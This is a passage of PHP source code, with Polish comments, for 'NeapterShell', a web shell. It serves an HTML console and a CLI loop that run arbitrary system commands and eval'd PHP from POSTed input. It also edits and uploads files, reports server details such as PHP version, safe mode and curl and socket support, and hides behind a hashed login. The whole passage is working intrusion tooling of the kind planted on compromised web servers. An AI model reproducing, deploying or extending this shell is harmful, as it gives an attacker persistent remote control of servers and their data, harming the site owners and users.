			htmlspecialchars( Request::getPost( 'cmd' ) )
		);
	}

	/**
	 * Wykonanie polecenia systemowago
	 *
	 * @access public
	 * @param  string $sCmd Komenda
	 * @return string
	 */
	private function getCommandInfo()
	{
		/**
		 * Help
		 */
		if( $this -> bHelp || ( $this -> iArgc !== 0 ) )
		{
			return <<<DATA
info - Wyświetla informacje o systemie

	Użycie:
		info
DATA;
		}

		return sprintf( "- SERVER:[%s], IP:[%s], Host:[%s]\r\nPHP:[%s], API:[%s], Url:[%s], Path:[%s]\r\nSAFE_MODE:[%d], EXE:[%d], CURL:[%d], SOCKET:[%d]",
			php_uname(),
			( $sIp = Request::getServer( 'REMOTE_ADDR' ) ),
			gethostbyaddr( $sIp ),
			PHP_VERSION,
			php_sapi_name(),
			( ( PHP_SAPI === 'cli' ) ? 'CLI' : Request::getCurrentUrl() ),
			( ( PHP_SAPI === 'cli' ) ? Request::getServer( 'PWD' ) . '/': '' ) . Request::getServer( 'SCRIPT_FILENAME' ),
			$this -> bSafeMode,
			$this -> bExec,
			function_exists( 'curl_init' ),
			function_exists( 'socket_create' )

		);
	}

	/**
	 * Domyslna akcja, dostep do konsoli
	 *
	 * @uses   Request
	 * @uses   Form
	 *
	 * @access public
	 * @return string
	 */
	public function getActionBrowser( $sCmd = NULL )
	{
		$bRaw = ( $sCmd !== NULL );

		/**
		 * Wlasna zawartosc strony; domyslnie znajduje sie okno konsoli
		 * linia polecen i przycisk 'Execute'
		 */
		$bOwnContent = FALSE;

		/**
		 * Zawartosc strony
		 */
		$sContent = NULL;

		/**
		 * Zawartosc konsoli
		 */
		$sConsole = NULL;

		/**
		 * Domyslna komenda to :ls -l sciezka_do_katalogu
		 */
		if( $sCmd === NULL )
		{
			if( PHP_SAPI === 'cli' )
			{
				/**
				 * Zmienne globalne to zlo ;), to powinno zostac przekazane
				 * jako parametr w konstruktorze ... ale coz ...
				 */
				$aArgv = $GLOBALS['argv'];
				array_shift( $aArgv );

				$sCmd = implode( $aArgv, ' ' );
			}
			else if( Request::getPost( 'cmd' ) === FALSE  )
			{
				$sCmd = ':ls -l ' . dirname( Request::getServer( 'SCRIPT_FILENAME' ) );
			}
			else
			{
				$sCmd = (string) Request::getPost( 'cmd' );
			}
		}

		/**
		 * Komendy shella rozpoczynaja sie od znaku ':'
		 */
		if( substr( $sCmd, 0, 1 ) === ':' )
		{
			if( ( $iPos = strpos( $sCmd, ' ' ) - 1 ) !== -1 )
			{
				$this -> sCmd = substr( $sCmd, 1, $iPos );
			}
			else
			{
				$this -> sCmd = (string) substr( $sCmd, 1 );
			}

			$this -> sArgv = ltrim( preg_replace( sprintf( '~^\:%s[\s+]?~', $this -> sCmd ), NULL, $sCmd ) );

			/**
			 * Rozdzielanie argumentow
			 *
			 * "sciezka do \"pliku\"" -> sciezka do "pliku"
			 */
			if( preg_match_all( '~\'(?:(?:\\\')|.+?)\'|"(?:(?:\\")|.+?)"|[^ \r\n\t\'"]+~', $this -> sArgv, $aMatch ) );
			{
				/**
				 * Usuwanie koncowych znakow " oraz ', zamienianie \" na " i \' na '
				 *
				 * Dalbym tutaj lambde, ale php 5.2 tego nie obsluguje ...
				 */
				array_walk( $aMatch[0], array( $this, 'parseArgv' ) );

				$this -> aArgv = $aMatch[0];

				if( isset( $this -> aArgv[0] ) && substr( $this -> aArgv[0], 0, 1 ) === '-' )
				{
					$this -> aOptv = str_split( substr( $this -> aArgv[0], 1 ) );
					array_shift( $this -> aArgv );
					$this -> sArgv = ltrim( implode( ' ', $this -> aArgv ) );
				}
			}

			$this -> sArgv = $this -> rmQuotes( rtrim( $this -> sArgv ) );

			$this -> iArgc = count( $this -> aArgv );

			/**
			 *  Lista komend i aliasy
			 */
			switch( $this -> sCmd )
			{
				case 'help':
					$sConsole = $this -> getCommandHelp();
					break ;
				case 'cd':
					$sConsole = $this -> getCommandCd();
					break ;
				case 'modules':
					$sConsole = $this -> getCommandModules();
					break ;
				case 'cr3d1ts':
					$sConsole = $this -> getCommandCr3d1ts();
					break ;
				case 'system':
				case 'exec':
					$sConsole = $this -> getCommandSystem( $this -> sArgv );
					break ;
				case 'info':
					$sConsole = $this -> getCommandInfo();
					break ;
				case 'autoload':
					$sConsole = $this -> getCommandAutoload();
					break ;
				case 'eval':
				case 'php':
					$sConsole = $this -> getCommandEval();
					break ;
				case 'version':
					$sConsole = $this -> getCommandVersion();
					break ;
				case 'logout':
					$sConsole = $this -> getCommandLogout();
					break ;
				case 'edit':
					$mContent = $this -> getCommandEdit( $this -> sArgv );

					if( is_bool( $mContent ) )
					{
						$sConsole = sprintf( 'Plik %szostał zapisany', ( ! $mContent ? 'nie ' : NULL ) );
					}
					/**
					 * Help
					 */
					else if( strncmp( $mContent, '<form', 5 ) !== 0 )
					{
						$sConsole = $mContent;
					}
					/**
					 * Formularz sluzacy do edycji pliku
					 */
					else
					{
						$bOwnContent = TRUE;
						$sContent = $mContent;
					}
					break ;
				case 'upload':
					$mContent = $this -> getCommandUpload( $this -> sArgv );

					if( is_bool( $mContent ) )
					{
						$sConsole = sprintf( 'Plik %szostał wrzucony', ( ! $mContent ? 'nie ' : NULL ) );
					}
					/**
					 * Help
					 */
					else if( strncmp( $mContent, '<form', 5 ) !== 0 )
					{
						$sConsole = $mContent;
					}
					/**
					 * Formularz sluzacy do wrzucenia pliku
					 */
					else
					{
						$bOwnContent = TRUE;
						$sContent = $mContent;
					}
					break ;
				default :
					if( $this -> aModules === array() )
					{
						$sConsole = 'Nie wczytano żadnych modułów !!!';
					}
					else if( array_key_exists( $this -> sCmd, $this -> aModules ) )
					{
						$sModule = $this -> aModules[ $this -> sCmd ];
						$oModule = new $sModule( $this );

						if( ( $this -> iArgc === 1 ) && ( $this -> aArgv[0] === 'help' ) )
						{
							$sConsole = $this -> aHelpModules[ $sModule ] . ' - ' . $oModule -> getHelp();
						}
						else
						{
							$sConsole = $oModule -> get();
						}
					}
					else
					{
						$sConsole = sprintf( 'Nie ma takiego polecenia "%s"', htmlspecialchars( $this -> sCmd ) );
					}
			}
		}
		elseif( $sCmd === '' )
		{
			$sConsole = 'Wpisz ":help", by zobaczyć pomoc';
		}
		/**
		 * Wykonanie komendy systemowej
		 */
		else
		{
			$sConsole = $this -> getCommandSystem( $sCmd );
		}

		if( $bRaw || ( PHP_SAPI === 'cli' ) )
		{
			return htmlspecialchars_decode( $sConsole ) . "\r\n";
		}

		/**
		 * Wlasna zawartosc okna
		 */
		if( ! $bOwnContent )
		{
			$sContent  = sprintf( '<pre id="console">%s</pre><br/>' .
				'<form action="%s" method="post">' .
				'<input type="text" name="cmd" value="%s" size="110" id="cmd" autocomplete="off"/>' .
				'<input type="submit" name="submit" value="Execute" id="cmd-send"/></form>',
				$sConsole,
				Request::getCurrentUrl(),
				htmlspecialchars( ( ( ( $sVal = Request::getPost( 'cmd' ) ) !== FALSE ) ? $sVal : (string) $sCmd ) )
			);
		}

		return $this -> getContent( $sContent );
	}

	/**
	 * Pobieranie calosci strony
	 *
	 * @uses   Request
	 *
	 * @access private
	 * @param  string  $sData         Zawartosc strony
	 * @param  boolean $bExdendedInfo [Optional]<br>Czy wyswietlac informacje o wersji PHP, zaladowanych modulach itp
	 * @return string
	 */
	private function getContent( $sData, $bExdendedInfo = TRUE )
	{
		/**
		 * isAjax
		 */
		if( strncasecmp( Request::getServer( 'HTTP_X_REQUESTED_WITH' ), 'XMLHttpRequest', 14 ) === 0 )
		{
			preg_match( '~<pre id="console">(.*)</pre>~s', $sData, $aMatch );

			if( $aMatch === array() )
			{
				return 'Występił nieznany błąd';
			}

			return $aMatch[1];
		}

		$sScript = file_get_contents( 'Lib/js.js' );

		/**
		 * Wylaczenie JavaScript
		 */
		if( $this -> bNoJs )
		{
			$sScript = NULL;
		}

		$sMenu = $this -> getMenu();
		$sGeneratedIn = sprintf( '%.5f', microtime( 1 ) - $this -> fGeneratedIn );
		$sTitle = sprintf( 'NeapterShell @ %s (%s)', Request::getServer( 'HTTP_HOST' ), Request::getServer( 'SERVER_ADDR' ) );
		$sVersion = self::VERSION;
return "<!DOCTYPE HTML><html><head><title>{$sTitle}</title><meta charset=\"utf-8\"><style>{$this -> sStyleSheet}</style></head><body><div id=\"body\">" .
( $bExdendedInfo ? "<div id=\"menu\">{$sMenu}</div>" : NULL ) .
"<div id=\"content\">{$sData}</div></div>" .
( $bExdendedInfo ? "<div id=\"bottom\">Wygenerowano w: <strong>{$sGeneratedIn}</strong> s | Wersja: <strong>{$sVersion}</strong></div>" : NULL ) .
"</div>{$sScript}</body></html>";
	}

	/**
	 * Wyswietlanie strony
	 *
	 * @access private
	 * @return void
	 */
	public function get()
	{
		/**
		 * Uwierzytelnianie
		 */
		if( ( PHP_SAPI !== 'cli' ) && ( $this -> sAuth !== NULL ) )
		{
			$sAuth = NULL;

			if(     is_file( $sAuthFilename = $this -> sTmp . '/' . $this -> sPrefix . md5( Request::getServer( 'REMOTE_ADDR' ) . Request::getServer( 'USER_AGENT' ) ) . '_auth' )
			    && ( ( $sData = file_get_contents( $sAuthFilename ) ) !== FALSE )
			)
			{
				$sAuth = $this -> decode( $sData );
			}

			if( $sAuth !== sha1( $this -> sAuth . Request::getServer( 'REMOTE_ADDR' ), TRUE ) )
			{
				/**
				 * Sprawdzanie poprawnosci sha1( "user\xffpass" );
				 */
				if( $this -> sAuth !== sha1( Request::getPost( 'user') . "\xff" . Request::getPost( 'pass' ) ) )
				{
					$this -> bNoJs = TRUE;

					echo $this -> getContent(
							sprintf( '<form action="%s" method="post"><input type="text" name="user"/><input type="password" name="pass"/><input type="submit" name="submit" value="Go !"/></form>',
								Request::getCurrentUrl()
							), FALSE
					);
					return ;
				}

				file_put_contents( $sAuthFilename, $this -> encode( sha1( $this -> sAuth . Request::getServer( 'REMOTE_ADDR' ), TRUE ) ) );
			}
		}

		/**
		 * CLI
		 */
		if( PHP_SAPI === 'cli' )
		{
			/**
			 * Naglowek
			 */
			printf( "\r\n   .  .          ,          __..     ..\r\n   |\ | _  _.._ -+- _ ._.  (__ |_  _ ||\r\n   | \|(/,(_][_) | (/,[    .__)[ )(/,||\r\n             |          v%s\r\n\r\n\r\n", self::VERSION );

			if( count( $GLOBALS['argv'] ) === 1 )
			{
				for(;;)
				{
					printf( '>> ns@127.0.0.1:%s$ ', getcwd() );
					echo $this -> getActionBrowser( rtrim( fgets( STDIN ) ) );
				}
				return ;
			}
		}

		/**
		 * Strasznie duzo jest kodu, wygodniej jest rozdzielic
		 * to na inne metody
		 */
		echo $this -> getActionBrowser();
	}

	/**
	 * Oczyszczanie argumentow ze zbednych znakow
	 *
	 * @access private
	 * @param  string & $sVar Argument
	 * @return void
	 */
	private function parseArgv( & $sVar )
	{
		$sVar = strtr( $sVar, array
			(
				'\\\'' => '\'',
				'\\"'  => '"'
			)
		);

		if(    ( ( substr( $sVar, 0, 1 ) === '"' ) && ( substr( $sVar, -1 ) === '"' ) )
		    || ( ( substr( $sVar, 0, 1 ) === '\'' ) && ( substr( $sVar, -1 ) === '\'' ) )
		)
		{
			$sVar = substr( $sVar, 1, -1 );
		}
	}

	/**
	 * Usuwanie poczakowego oraz koncowego znaku " / '
	 *
	 * @access private
	 * @param  string $sVal Ciag znakow
	 * @return string
	 */
	private function rmQuotes( $sVal )
	{
		if(    ( ( substr( $sVal, 0, 1 ) === '"' ) && ( substr( $sVal, -1 ) === '"' ) )
		    || ( ( substr( $sVal, 0, 1 ) === '\'' ) && ( substr( $sVal, -1 ) === '\'' ) )
		)
		{
			return substr( $sVal, 1, -1 );
		}

		return $sVal;
	}

}

/**
 * Wylaczanie wszystkich bufferow
 */
for( $i = 0; $i < ob_get_level(); ++$i )
{
	ob_end_clean();
}

$oShell = new Shell();
$oShell -> get();

exit ;